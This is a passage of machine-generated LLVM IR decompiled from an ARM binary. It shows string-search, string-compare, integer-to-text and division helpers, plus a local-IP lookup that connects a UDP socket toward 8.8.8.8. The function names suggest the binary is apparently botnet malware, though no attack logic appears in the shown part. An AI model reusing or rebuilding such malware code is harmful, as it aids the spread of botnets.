  %stack_var_-36 = alloca i32, align 4
  %v3_1041c = load i32, i32* @r4, align 4
  %v6_1041c = load i32, i32* @r5, align 4
  %v9_1041c = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_1042c = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10434 = inttoptr i32 %v0_1042c to i32*
  store i32 0, i32* %v2_10434, align 4
  %v0_10440 = load i32, i32* %r4.global-to-local, align 4
  %v3_10444 = call i32 @socket(i32 2, i32 2, i32 %v0_10440)
  %v7_10448 = icmp eq i32 %v3_10444, -1
  store i32 %v3_10444, i32* @r5, align 4
  br i1 %v7_10448, label %bb, label %dec_label_pc_10458

bb:                                               ; preds = %entry
  %v1_10450 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_104a4

dec_label_pc_10458:                               ; preds = %entry
  %v2_10464 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10464, i32* @r4, align 4
  %v0_10470 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10484 = call i32 @__libc_connect(i32 %v3_10444, i32 %v2_10464, i32 %v0_10470)
  store i32 %v2_10464, i32* @r1, align 4
  %v2_1048c = ptrtoint i32* %stack_var_-20 to i32
  %v0_10490 = load i32, i32* @r5, align 4
  %v3_10494 = call i32 @__GI_getsockname(i32 %v0_10490, i32 %v2_10464, i32 %v2_1048c)
  %v0_10498 = load i32, i32* @r5, align 4
  %v1_1049c = call i32 @__GI___libc_close(i32 %v0_10498)
  br label %dec_label_pc_104a4

dec_label_pc_104a4:                               ; preds = %bb, %dec_label_pc_10458
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10458 ], [ %v1_10450, %bb ]
  store i32 %v3_1041c, i32* @r4, align 4
  store i32 %v6_1041c, i32* @r5, align 4
  store i32 %v9_1041c, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10464, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10444, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 25, 26, 24, 4, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 3, 2, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_104a4, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_104b4 = load i8, i8* %tmp, align 1
  %v4_104b4 = zext i8 %v3_104b4 to i32
  store i32 %v4_104b4, i32* @r3, align 4
  %v2_104b8 = icmp eq i8 %v3_104b4, 0
  br i1 %v2_104b8, label %bb, label %dec_label_pc_104cc

bb:                                               ; preds = %entry
  br label %dec_label_pc_104e0

dec_label_pc_104cc:                               ; preds = %entry
  br label %dec_label_pc_104d0

dec_label_pc_104d0:                               ; preds = %dec_label_pc_104d0, %dec_label_pc_104cc
  %v0_104d0 = phi i32 [ %v1_104d0, %dec_label_pc_104d0 ], [ 0, %dec_label_pc_104cc ]
  %v1_104d0 = add i32 %v0_104d0, 1
  %v2_104d4 = add i32 %v1_104d0, %arg2
  %v3_104d4 = inttoptr i32 %v2_104d4 to i8*
  %v4_104d4 = load i8, i8* %v3_104d4, align 1
  %v6_104d4 = zext i8 %v4_104d4 to i32
  store i32 %v6_104d4, i32* @r3, align 4
  %v2_104d8 = icmp eq i8 %v4_104d4, 0
  br i1 %v2_104d8, label %dec_label_pc_104e0, label %dec_label_pc_104d0

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104d0, %bb
  %v0_1052421 = phi i32 [ %v4_104b4, %bb ], [ %v1_104d0, %dec_label_pc_104d0 ]
  %v0_104e82 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_104e82, 1
  br i1 %tmp29, label %dec_label_pc_10538, label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %dec_label_pc_104e0, %dec_label_pc_104e8.backedge
  %v0_104ec.in = phi i32 [ %v0_104ec, %dec_label_pc_104e8.backedge ], [ %v0_104e82, %dec_label_pc_104e0 ]
  %v1_10500 = phi i32 [ %v1_1050015, %dec_label_pc_104e8.backedge ], [ 0, %dec_label_pc_104e0 ]
  %v0_104f4 = phi i32 [ %v5_104f4, %dec_label_pc_104e8.backedge ], [ %tmp23, %dec_label_pc_104e0 ]
  %v0_104ec = add i32 %v0_104ec.in, -1
  %v1_104f4 = inttoptr i32 %v0_104f4 to i8*
  %v2_104f4 = load i8, i8* %v1_104f4, align 1
  %v3_104f4 = zext i8 %v2_104f4 to i32
  %v5_104f4 = add i32 %v0_104f4, 1
  %v1_104f8 = add nsw i32 %v3_104f4, -65
  %v2_10500 = add i32 %v1_10500, %arg2
  %v3_10500 = inttoptr i32 %v2_10500 to i8*
  %v4_10500 = load i8, i8* %v3_10500, align 1
  %v6_10500 = zext i8 %v4_10500 to i32
  store i32 %v6_10500, i32* @r3, align 4
  %v1_10504 = add nsw i32 %v6_10500, -65
  %tmp38 = icmp ult i32 %v1_104f8, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_104f4
  %v5_10508 = or i32 %v3_104f4, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_104f4, %bb30
  %v0_10514 = phi i32 [ %v3_104f4, %dec_label_pc_104f4 ], [ %v5_10508, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10504, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10510 = or i32 %v6_10500, 96
  store i32 %v5_10510, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10514 = phi i32 [ %v6_10500, %bb31 ], [ %v5_10510, %bb32 ]
  %v9_10514 = icmp eq i32 %v0_10514, %v1_10514
  br i1 %v9_10514, label %dec_label_pc_10520, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_104e8.backedge

dec_label_pc_104e8.backedge:                      ; preds = %bb34, %dec_label_pc_10520
  %v1_1050015 = phi i32 [ 0, %bb34 ], [ %v1_10520, %dec_label_pc_10520 ]
  %tmp35 = icmp slt i32 %v0_104ec, 1
  br i1 %tmp35, label %dec_label_pc_10538, label %dec_label_pc_104f4

dec_label_pc_10520:                               ; preds = %bb33
  %v1_10520 = add i32 %v1_10500, 1
  %v9_10524 = icmp eq i32 %v0_1052421, %v1_10520
  br i1 %v9_10524, label %dec_label_pc_1052c, label %dec_label_pc_104e8.backedge

dec_label_pc_1052c:                               ; preds = %dec_label_pc_10520
  %v2_1052c = sub i32 %v5_104f4, %tmp23
  br label %dec_label_pc_10538

dec_label_pc_10538:                               ; preds = %dec_label_pc_104e8.backedge, %dec_label_pc_104e0, %dec_label_pc_1052c
  %storemerge = phi i32 [ %v2_1052c, %dec_label_pc_1052c ], [ -1, %dec_label_pc_104e0 ], [ -1, %dec_label_pc_104e8.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10520, { 1, 0 }
  uselistorder i32 %v0_104f4, { 1, 0 }
  uselistorder i32 %v1_10500, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_10538, { 2, 0, 1 }
  uselistorder label %dec_label_pc_104e8.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_104f4, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10540 = load i8, i8* %arg1, align 1
  %v2_10544 = icmp eq i8 %v2_10540, 0
  br i1 %v2_10544, label %bb, label %dec_label_pc_10550

bb:                                               ; preds = %entry
  %v3_10540 = zext i8 %v2_10540 to i32
  br label %dec_label_pc_10564

dec_label_pc_10550:                               ; preds = %entry
  br label %dec_label_pc_10554

dec_label_pc_10554:                               ; preds = %dec_label_pc_10554, %dec_label_pc_10550
  %v0_10554 = phi i32 [ %v1_10554, %dec_label_pc_10554 ], [ 0, %dec_label_pc_10550 ]
  %v1_10554 = add i32 %v0_10554, 1
  %v2_10558 = add i32 %v1_10554, %tmp
  %v3_10558 = inttoptr i32 %v2_10558 to i8*
  %v4_10558 = load i8, i8* %v3_10558, align 1
  %v2_1055c = icmp eq i8 %v4_10558, 0
  br i1 %v2_1055c, label %dec_label_pc_10564, label %dec_label_pc_10554

dec_label_pc_10564:                               ; preds = %dec_label_pc_10554, %bb
  %v0_105b03 = phi i32 [ %v3_10540, %bb ], [ %v1_10554, %dec_label_pc_10554 ]
  %v1_10564 = inttoptr i32 %arg2 to i8*
  %v2_10564 = load i8, i8* %v1_10564, align 1
  %v3_10564 = zext i8 %v2_10564 to i32
  store i32 %v3_10564, i32* @r3, align 4
  %v2_10568 = icmp eq i8 %v2_10564, 0
  br i1 %v2_10568, label %bb21, label %dec_label_pc_10574

bb21:                                             ; preds = %dec_label_pc_10564
  store i32 %v3_10564, i32* @r2, align 4
  br label %dec_label_pc_10588

dec_label_pc_10574:                               ; preds = %dec_label_pc_10564
  br label %dec_label_pc_10578

dec_label_pc_10578:                               ; preds = %dec_label_pc_10578, %dec_label_pc_10574
  %v0_10578 = phi i32 [ %v1_10578, %dec_label_pc_10578 ], [ 0, %dec_label_pc_10574 ]
  %v1_10578 = add i32 %v0_10578, 1
  store i32 %v1_10578, i32* @r2, align 4
  %v2_1057c = add i32 %v1_10578, %arg2
  %v3_1057c = inttoptr i32 %v2_1057c to i8*
  %v4_1057c = load i8, i8* %v3_1057c, align 1
  %v6_1057c = zext i8 %v4_1057c to i32
  store i32 %v6_1057c, i32* @r3, align 4
  %v2_10580 = icmp eq i8 %v4_1057c, 0
  br i1 %v2_10580, label %dec_label_pc_10588, label %dec_label_pc_10578

dec_label_pc_10588:                               ; preds = %dec_label_pc_10578, %bb21
  %v0_10588 = phi i32 [ %v3_10564, %bb21 ], [ %v1_10578, %dec_label_pc_10578 ]
  %v9_10588 = icmp eq i32 %v0_10588, %v0_105b03
  br i1 %v9_10588, label %dec_label_pc_105b0.preheader, label %dec_label_pc_10590

dec_label_pc_105b0.preheader:                     ; preds = %dec_label_pc_10588
  %v2_105b05 = icmp eq i32 %v0_105b03, 0
  br i1 %v2_105b05, label %dec_label_pc_105b8, label %dec_label_pc_10598

dec_label_pc_10590:                               ; preds = %dec_label_pc_10598, %dec_label_pc_10588
  ret i32 0

dec_label_pc_10598:                               ; preds = %dec_label_pc_105a8, %dec_label_pc_105b0.preheader
  %v0_105b0.in = phi i32 [ %v0_105b0, %dec_label_pc_105a8 ], [ %v0_105b03, %dec_label_pc_105b0.preheader ]
  %v0_105ac = phi i32 [ %v1_105ac, %dec_label_pc_105a8 ], [ %arg2, %dec_label_pc_105b0.preheader ]
  %v0_105a8 = phi i32 [ %v1_105a8, %dec_label_pc_105a8 ], [ %tmp, %dec_label_pc_105b0.preheader ]
  %v0_105b0 = add i32 %v0_105b0.in, -1
  %v1_10598 = inttoptr i32 %v0_105a8 to i8*
  %v2_10598 = load i8, i8* %v1_10598, align 1
  %v3_10598 = zext i8 %v2_10598 to i32
  store i32 %v3_10598, i32* @r2, align 4
  %v1_1059c = inttoptr i32 %v0_105ac to i8*
  %v2_1059c = load i8, i8* %v1_1059c, align 1
  %v3_1059c = zext i8 %v2_1059c to i32
  store i32 %v3_1059c, i32* @r3, align 4
  %v9_105a0 = icmp eq i8 %v2_10598, %v2_1059c
  br i1 %v9_105a0, label %dec_label_pc_105a8, label %dec_label_pc_10590

dec_label_pc_105a8:                               ; preds = %dec_label_pc_10598
  %v1_105a8 = add i32 %v0_105a8, 1
  %v1_105ac = add i32 %v0_105ac, 1
  %v2_105b0 = icmp eq i32 %v0_105b0, 0
  br i1 %v2_105b0, label %dec_label_pc_105b8, label %dec_label_pc_10598

dec_label_pc_105b8:                               ; preds = %dec_label_pc_105a8, %dec_label_pc_105b0.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10578, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10540, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_105c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_105c4, i32* %r8.global-to-local, align 4
  %v2_105c4 = icmp eq i32 %v0_105c4, 0
  store i1 %v2_105c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_105c4, label %dec_label_pc_106a4, label %dec_label_pc_105d4

dec_label_pc_105d4:                               ; preds = %entry
  %v3_105d4 = icmp eq i8 %arg1, 0
  store i1 %v3_105d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_105d4, label %.thread, label %dec_label_pc_105e8

.thread:                                          ; preds = %dec_label_pc_105d4
  %v4_105dc = inttoptr i32 %v0_105c4 to i8*
  store i8 48, i8* %v4_105dc, align 1
  %v0_105e0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_105e0.pr.pr, label %.thread1, label %dec_label_pc_105e8

.thread1:                                         ; preds = %.thread
  %v4_105e0 = load i32, i32* %r8.global-to-local, align 4
  %v5_105e0 = add i32 %v4_105e0, 1
  %v6_105e0 = inttoptr i32 %v5_105e0 to i8*
  store i8 0, i8* %v6_105e0, align 1
  %v0_105e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_105e4.pr.pr, label %dec_label_pc_106a4, label %dec_label_pc_105e8

dec_label_pc_105e8:                               ; preds = %dec_label_pc_105d4, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_105ec = icmp eq i32 %arg2, 10
  store i1 %v7_105ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105ec, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_105e8
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_105e8
  %v4_105e8 = zext i1 %tmp48 to i32
  store i32 %v4_105e8, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_1060c8 = sub nsw i32 0, %tmp
  %tmp.v3_1060c8 = select i1 %phitmp, i32 %tmp, i32 %v3_1060c8
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_1060c8, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_10618 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_10618, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1061c

dec_label_pc_1061c:                               ; preds = %bb46, %.thread6
  %v2_1063c = phi i32 [ %v1_10648, %bb46 ], [ 32, %.thread6 ]
  %v0_10630 = phi i32 [ %v2_10640, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_10620 = load i32, i32* %r6.global-to-local, align 4
  %v3_10624 = urem i32 %v0_10630, %v0_10620
  store i32 %v3_10624, i32* %r1.global-to-local, align 4
  %v7_10628 = icmp eq i32 %v3_10624, 9
  store i1 %v7_10628, i1* %cpsr_z.global-to-local, align 1
  %v1_1062c = add i32 %v3_10624, 48
  store i32 %v0_10630, i32* %r0.global-to-local, align 4
  %v7_10634 = icmp sgt i32 %v3_10624, 9
  %extract.t = trunc i32 %v1_1062c to i8
  br i1 %v7_10634, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1061c
  %v9_10634 = add i32 %v3_10624, 55
  %extract.t28 = trunc i32 %v9_10634 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1061c, %bb45
  %v0_1063c.off0 = phi i8 [ %extract.t, %dec_label_pc_1061c ], [ %extract.t28, %bb45 ]
  store i32 %v0_10620, i32* %r1.global-to-local, align 4
  %v3_1063c = load i32, i32* %r7.global-to-local, align 4
  %v4_1063c = add i32 %v3_1063c, %v2_1063c
  %v5_1063c = inttoptr i32 %v4_1063c to i8*
  store i8 %v0_1063c.off0, i8* %v5_1063c, align 1
  %v0_10640 = load i32, i32* %r0.global-to-local, align 4
  %v1_10640 = load i32, i32* %r1.global-to-local, align 4
  %v2_10640 = udiv i32 %v0_10640, %v1_10640
  store i32 %v2_10640, i32* %r0.global-to-local, align 4
  %v2_10644 = icmp ugt i32 %v1_10640, %v0_10640
  store i1 %v2_10644, i1* %cpsr_z.global-to-local, align 1
  %v0_10648 = load i32, i32* %r5.global-to-local, align 4
  %v1_10648 = add i32 %v0_10648, -1
  store i32 %v1_10648, i32* %r5.global-to-local, align 4
  br i1 %v2_10644, label %dec_label_pc_10650, label %dec_label_pc_1061c

dec_label_pc_10650:                               ; preds = %bb46
  %v0_10650 = load i32, i32* %sl.global-to-local, align 4
  %v2_10650 = icmp eq i32 %v0_10650, 0
  store i1 %v2_10650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10650, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10650
  %v3_10654 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10658 = add i32 %v1_10648, %v3_10654
  store i32 %v3_10658, i32* %r2.global-to-local, align 4
  %v4_10660 = add i32 %v3_10658, -34
  %v5_10660 = inttoptr i32 %v4_10660 to i8*
  store i8 45, i8* %v5_10660, align 1
  %v0_10664.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10664.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10664.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10650
  %v1_10664 = phi i32 [ %v1_10648, %dec_label_pc_10650 ], [ %v1_10664.pre, %.thread11 ]
  %v2_10664 = add i32 %v1_10664, 1
  store i32 %v2_10664, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10670 = phi i32 [ %v2_10664, %.thread12 ], [ %v1_10664.pre, %.thread11 ]
  %v0_10668 = load i32, i32* %r7.global-to-local, align 4
  %v2_10668 = add i32 %v0_10668, %v1_10670
  %v3_10668 = inttoptr i32 %v2_10668 to i8*
  %v4_10668 = load i8, i8* %v3_10668, align 1
  %v6_10668 = zext i8 %v4_10668 to i32
  %v2_1066c = icmp eq i8 %v4_10668, 0
  store i1 %v2_1066c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10668, i32* %r2.global-to-local, align 4
  br i1 %v2_1066c, label %dec_label_pc_106b4, label %dec_label_pc_1067c.preheader

dec_label_pc_1067c.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1067c

dec_label_pc_1067c:                               ; preds = %dec_label_pc_1067c.preheader, %dec_label_pc_1067c
  %v0_1067c = phi i32 [ 0, %dec_label_pc_1067c.preheader ], [ %v1_1067c, %dec_label_pc_1067c ]
  %v1_1067c = add i32 %v0_1067c, 1
  store i32 %v1_1067c, i32* %r1.global-to-local, align 4
  %v2_10680 = add i32 %v1_1067c, %v2_10668
  %v3_10680 = inttoptr i32 %v2_10680 to i8*
  %v4_10680 = load i8, i8* %v3_10680, align 1
  %v2_10684 = icmp eq i8 %v4_10680, 0
  store i1 %v2_10684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10684, label %dec_label_pc_1068c, label %dec_label_pc_1067c

dec_label_pc_1068c:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_106b4
  %v0_1069025 = phi i32 [ %v6_10668, %dec_label_pc_106b4 ], [ %v1_1067c, %dec_label_pc_1067c ]
  %v0_1068c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1068c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10690

dec_label_pc_10690:                               ; preds = %dec_label_pc_10690.dec_label_pc_10690_crit_edge, %dec_label_pc_1068c
  %v2_1069c = phi i32 [ %v5_1069c, %dec_label_pc_10690.dec_label_pc_10690_crit_edge ], [ %v0_1068c, %dec_label_pc_1068c ]
  %v0_10694 = phi i32 [ %v0_10694.pre, %dec_label_pc_10690.dec_label_pc_10690_crit_edge ], [ %v2_10668, %dec_label_pc_1068c ]
  %v0_10690 = phi i32 [ %v0_10690.pre, %dec_label_pc_10690.dec_label_pc_10690_crit_edge ], [ %v0_1069025, %dec_label_pc_1068c ]
  %v1_10690 = add i32 %v0_10690, -1
  store i32 %v1_10690, i32* %r1.global-to-local, align 4
  %v1_10694 = inttoptr i32 %v0_10694 to i8*
  %v2_10694 = load i8, i8* %v1_10694, align 1
  %v5_10694 = add i32 %v0_10694, 1
  store i32 %v5_10694, i32* %r2.global-to-local, align 4
  %v3_10698 = icmp eq i32 %v0_10690, 0
  store i1 %v3_10698, i1* %cpsr_z.global-to-local, align 1
  %v3_1069c = inttoptr i32 %v2_1069c to i8*
  store i8 %v2_10694, i8* %v3_1069c, align 1
  %v4_1069c = load i32, i32* %r0.global-to-local, align 4
  %v5_1069c = add i32 %v4_1069c, 1
  store i32 %v5_1069c, i32* %r0.global-to-local, align 4
  br i1 %v3_10698, label %dec_label_pc_106a4, label %dec_label_pc_10690.dec_label_pc_10690_crit_edge

dec_label_pc_10690.dec_label_pc_10690_crit_edge:  ; preds = %dec_label_pc_10690
  %v0_10690.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10694.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10690

dec_label_pc_106a4:                               ; preds = %dec_label_pc_10690, %.thread1, %entry
  %v0_106a4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_106a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_106a4

dec_label_pc_106b4:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10668, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1068c

; uselistorder directives
  uselistorder i32 %v5_1069c, { 1, 0 }
  uselistorder i1 %v3_10698, { 1, 0 }
  uselistorder i32 %v0_10694, { 1, 0 }
  uselistorder i32 %v1_1067c, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10668, { 1, 0 }
  uselistorder i32 %v2_10668, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10664.pre, { 1, 0 }
  uselistorder i32 %v1_10648, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10640, { 1, 0 }
  uselistorder i32 %v3_10624, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_105c4, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1068c, { 1, 0 }
  uselistorder label %dec_label_pc_1067c, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_105e8, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_106bc = load i32, i32* @r1, align 4
  %v1_106bc = add i32 %v0_106bc, -1
  store i32 %v1_106bc, i32* %r2.global-to-local, align 4
  %v2_106bc = icmp eq i32 %v0_106bc, 0
  %v7_106bc = icmp eq i32 %v0_106bc, 1
  %v0_106c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_106bc, i32 %v0_106c0)
  br i1 %v2_106bc, label %dec_label_pc_107a4, label %dec_label_pc_106c8

dec_label_pc_106c8:                               ; preds = %entry
  %v0_106c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_106c8 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_106c8, %v1_106c8
  br i1 %tmp, label %dec_label_pc_106d0, label %dec_label_pc_1075c

dec_label_pc_106d0:                               ; preds = %dec_label_pc_106c8
  %v1_106d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_106d0 = and i32 %v1_106d0, %v1_106c8
  %v4_106d0 = icmp eq i32 %v2_106d0, 0
  br i1 %v4_106d0, label %dec_label_pc_10768, label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %dec_label_pc_106d0
  %v3_106d8 = icmp ult i32 %v1_106c8, 536870912
  br i1 %v3_106d8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_106d8
  %v4_106dc = mul i32 %v1_106c8, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_106d8, %.thread
  %v0_106fc.pr36.ph = phi i32 [ %v4_106dc, %.thread ], [ %v1_106c8, %dec_label_pc_106d8 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_106d8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_106fc.pr36 = phi i32 [ %v4_106f0, %bb81 ], [ %v0_106fc.pr36.ph, %.preheader.preheader ]
  %v1_106f4 = phi i32 [ %v4_106f4, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_106e8 = icmp ugt i32 %v0_106fc.pr36, 268435455
  br i1 %v2_106e8, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_106fcthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_106ec = icmp ult i32 %v0_106fc.pr36, %v0_106c8
  br i1 %v4_106ec, label %bb80, label %dec_label_pc_106fcthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_106f0 = and i32 %v0_106fc.pr36, 268435456
  %v3_106f0 = icmp eq i32 %v2_106f0, 0
  %v4_106f0 = mul i32 %v0_106fc.pr36, 16
  br i1 %v3_106f0, label %bb81, label %dec_label_pc_106fc.loopexit

bb81:                                             ; preds = %bb80
  %v2_106f4 = and i32 %v1_106f4, 268435456
  %v3_106f4 = icmp eq i32 %v2_106f4, 0
  %v4_106f4 = mul i32 %v1_106f4, 16
  br i1 %v3_106f4, label %.preheader, label %dec_label_pc_106fcthread-pre-split.loopexit.loopexit

dec_label_pc_106fcthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1070848.ph = phi i32 [ %v1_106f4, %bb ], [ %v4_106f4, %bb81 ]
  %v0_106fc.pr38.ph = phi i32 [ %v0_106fc.pr36, %bb ], [ %v4_106f0, %bb81 ]
  br label %dec_label_pc_106fcthread-pre-split.loopexit

dec_label_pc_106fcthread-pre-split.loopexit:      ; preds = %dec_label_pc_106fcthread-pre-split.loopexit.loopexit, %.thread2
  %v1_1070848 = phi i32 [ %v1_106f4, %.thread2 ], [ %v1_1070848.ph, %dec_label_pc_106fcthread-pre-split.loopexit.loopexit ]
  %v0_106fc.pr38 = phi i32 [ %v0_106fc.pr36, %.thread2 ], [ %v0_106fc.pr38.ph, %dec_label_pc_106fcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_106fcthread-pre-split

dec_label_pc_106fcthread-pre-split:               ; preds = %dec_label_pc_106fcthread-pre-split.loopexit, %bb83
  %v1_1070846 = phi i32 [ %v1_1070848, %dec_label_pc_106fcthread-pre-split.loopexit ], [ %v3_10708, %bb83 ]
  %v0_106fc.pr = phi i32 [ %v0_106fc.pr38, %dec_label_pc_106fcthread-pre-split.loopexit ], [ %v3_10704, %bb83 ]
  br label %dec_label_pc_106fc

dec_label_pc_106fc.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_106fc

dec_label_pc_106fc:                               ; preds = %dec_label_pc_106fc.loopexit, %dec_label_pc_106fcthread-pre-split
  %v1_10708 = phi i32 [ %v1_1070846, %dec_label_pc_106fcthread-pre-split ], [ %v1_106f4, %dec_label_pc_106fc.loopexit ]
